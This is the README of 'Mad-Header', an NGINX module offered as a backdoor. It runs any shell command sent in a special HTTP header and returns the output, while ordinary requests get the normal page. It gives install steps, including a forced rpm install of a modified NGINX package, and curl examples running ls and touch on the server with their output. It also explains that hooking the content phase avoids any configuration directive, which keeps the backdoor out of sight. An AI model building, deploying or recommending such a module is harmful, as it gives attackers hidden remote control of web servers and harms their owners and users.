# Mad-Header
NGINX module to allow for RCE through a specific header. 


## Installation
There is a install script provided in the repo. It will pull down NGINX and compile it with the module. Then NGINX directory will be setup in `/usr/local/nginx` (NGINX default). After this the `NGX_HTTP_CONTENT_PHASE` is hooked and the module will be running in NGINX. In addition, the rpm file provided can be used to install the exploited NGINX by running the command below.

```
rpm -U nginx-1.12.2-2.el7.x86_64.rpm --nodeps --force
```


## Usage
To use the Mad Header simply supply your command as a value to the `Mad-Header` HTTP header. The output (stdout) of your command will be the response body of the command run. If there is no stdout from the command, then the response body will obviously be empty. An example or two is shown below.

```
[root@localhost Mad-Header]# curl localhost --header "Mad-Header: ls -la /tmp"
total 4
drwxrwxrwt.  8 root root 123 Nov 30 11:39 .
dr-xr-xr-x. 17 root root 224 Oct 30 14:11 ..
drwxrwxrwt.  2 root root  19 Nov 29 22:23 .ICE-unix
drwxrwxrwt.  2 root root   6 Oct 30 14:09 .Test-unix
-r--r--r--.  1 root root  11 Nov 29 22:23 .X0-lock
drwxrwxrwt.  2 root root  16 Nov 29 22:23 .X11-unix
drwxrwxrwt.  2 root root   6 Oct 30 14:09 .XIM-unix
drwx------.  2 root root  20 Nov 29 22:24 .esd-0
drwxrwxrwt.  2 root root   6 Oct 30 14:09 .font-unix
[root@localhost Mad-Header]# curl localhost --header "Mad-Header: touch /tmp/hello"
curl: (52) Empty reply from server
[root@localhost Mad-Header]# curl localhost --header "Mad-Header: ls -la /tmp"
total 4
drwxrwxrwt.  8 root   root   136 Nov 30 11:39 .
dr-xr-xr-x. 17 root   root   224 Oct 30 14:11 ..
drwxrwxrwt.  2 root   root    19 Nov 29 22:23 .ICE-unix
drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .Test-unix
-r--r--r--.  1 root   root    11 Nov 29 22:23 .X0-lock
drwxrwxrwt.  2 root   root    16 Nov 29 22:23 .X11-unix
drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .XIM-unix
drwx------.  2 root   root    20 Nov 29 22:24 .esd-0
drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .font-unix
-rw-rw-rw-.  1 nobody nobody   0 Nov 30 11:39 hello
```
If the header is not supplied (or a different location context is hit) then the server will respond to requests as normal. See below for example.
```
[root@localhost Mad-Header]# curl localhost
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

## Customization
For customization the NGINX directive can be changed by altering the directive string in the `ngx_http_mad_header_commands` struct in `ngx_http_mad_header_module.c` (it is currently set to `mad_header`).

## Resources
[The foremost resource on NGINX Modules](https://www.evanmiller.org/nginx-modules-guide.html)

[A basic hello world module](https://github.com/perusio/nginx-hello-world-module/)

[The NGINX Source begins to be helpful after you loose sanity](https://github.com/nginx/nginx/)

[The NGINX API Documentation also helps](https://www.nginx.com/resources/wiki/extending/api/utility/)

[Also not a bad small guide](http://www.nginxguts.com/2011/02/http-modules/)
[From the same source as above but goes over NGINX Phases](http://www.nginxguts.com/2011/01/phases/)

[This would be the guide to follow to dynamically link the module](https://www.nginx.com/blog/compiling-dynamic-modules-nginx-plus/)
[This is where I go the idea to hook the NGX_HTTP_CONTENT_PHASE to avoid directive use](http://www.nginx-discovery.com/2011/02/day-21-http-handler-vs-content-phase.html)
